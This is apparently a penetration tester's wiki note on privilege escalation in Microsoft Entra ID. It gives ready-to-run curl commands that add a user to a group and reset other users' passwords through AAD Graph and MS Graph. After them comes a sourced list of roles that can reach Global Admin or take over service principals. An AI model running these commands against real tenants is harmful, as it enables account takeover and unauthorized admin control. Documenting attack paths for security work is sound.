---
title: Entra Escalation
---

[[notes/mitre-attack/privilege-escalation]] in [[notes/entra/index]].

Add the user with id `f66e133c-bd01-4b0b-b3b7-7cd949fd45f3` to the group `e6870783-1378-4078-b242-84c08c6dc0d7` trough AAD Graph.

~~~ bash
jq -n --arg tenant $tenant_id '{"url":"https://graph.windows.net/\($tenant)/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3"}' | curl -sSf -H 'Content-Type: application/json' -H "Authorization: Bearer $msgraph_token" "https://graph.windows.net/$tenant_id/groups/e6870783-1378-4078-b242-84c08c6dc0d7/$links/members?api-version=1.6" -d @-
~~~

Reset the password of another user trough MS Graph.

~~~ bash
curl -sSf -H "Authorization: Bearer $msgraph_token" "https://graph.microsoft.com/v1.0/users/$upn/authentication/methods/28c10230-6103-485e-b985-444c60001490/resetPassword" -d '{"newPassword":"P@ssw0rd1234"}' | jq
~~~

Reset the password of another user trough AAD Graph.

~~~ bash
curl -sSf -H "Authorization: Bearer $aadgraph_token" "https://graph.windows.net/$tenant_id/users/$user_id?api-version=1.6" -d '{"passwordProfile":{"password":"P@ssw0rd1234","forceChangePasswordNextLogin":false,"enforceChangePasswordPolicy":false}}' -X PATCH -H 'Content-Type: application/json'
~~~

More paths:

- *Partner Tier2 Support* role can promote arbitrary users to Global Admin ([source](http://web.archive.org/web/20240217144629/https://scribe.rip/@specterops/the-most-dangerous-entra-role-youve-probably-never-heard-of-e00ea08b8661))
- with MS Graph *Organization.ReadWrite.All* permission and either *Policy.ReadWrite.AuthenticationMethod* permission or *Authentication Policy Administrator* role you can configure Certificate-Based Authentication and impersonate Global Admin ([source](http://web.archive.org/web/20240217144613/https://scribe.rip/@spectreops/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f))
- *Application Developer* can register apps even if it is disabled for regular users
- *Global Administrator* and *Privileged Role Administrator* can grant tenant-wide consent for any app with any permission (application and delegated)
- *Cloud Application Administrator* and *Application Administrator* can grant tenant-wide consent for any app with any permission except for AAD Graph and Microsoft Graph ([source](https://twitter.com/NathanMcNulty/status/1750761219412423015), [source](https://twitter.com/cnotin/status/1752358678840185300))
- *Security Administrator*, *Hybrid Identity Administrator*, *External Identity Provider Administrator*, *Domain Name Administrator* and *Partner Tier2 Support* can become global admin trough [[notes/entra/federation]]
- *Application Administrator*, *Cloud Application Administrator*, *Directory Synchronization Accounts*, *Hybrid Identity Administrator* and *Global Administrator* can take over any service principal by adding new credentials to the app ([source](http://web.archive.org/web/20230523081045/https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/))
- *Privileged Role Administrator* can become *Global Administrator* ([source](http://web.archive.org/web/20231028211850/https://cloudbrothers.info/azure-attack-paths/#azure-ad-roles))
- *Global Administrator* can take over all subscriptions in the tenant by granting himself the *User Access Administrator* role in ARM ([source](http://web.archive.org/web/20231028211850/https://cloudbrothers.info/azure-attack-paths/#elevate-azure-subscription-access), [source](http://web.archive.org/web/20230123080516/https://sofblocks.github.io/azure-attack-paths/#adding-global-admin-to-azure-subscriptions), [source](https://docs.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin))
- *Active Authentication Administrators* have no privileges besides the name ([source](https://web.archive.org/web/20240202215858/https://scribe.rip/@rootsecdev/active-authentication-administrators-in-azure-0d453452ce6b))

References:

- [Entra ID Roles](https://www.azadvertizer.net/azEntraIdRolesAdvertizer.html)
- [Entra ID Role Actions](https://www.azadvertizer.net/azEntraIdRoleActionsAdvertizer.html)
- [Entra ID API permissions](https://www.azadvertizer.net/azEntraIdAPIpermissionsAdvertizer.html)
- [Entra ID built-in roles](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference)
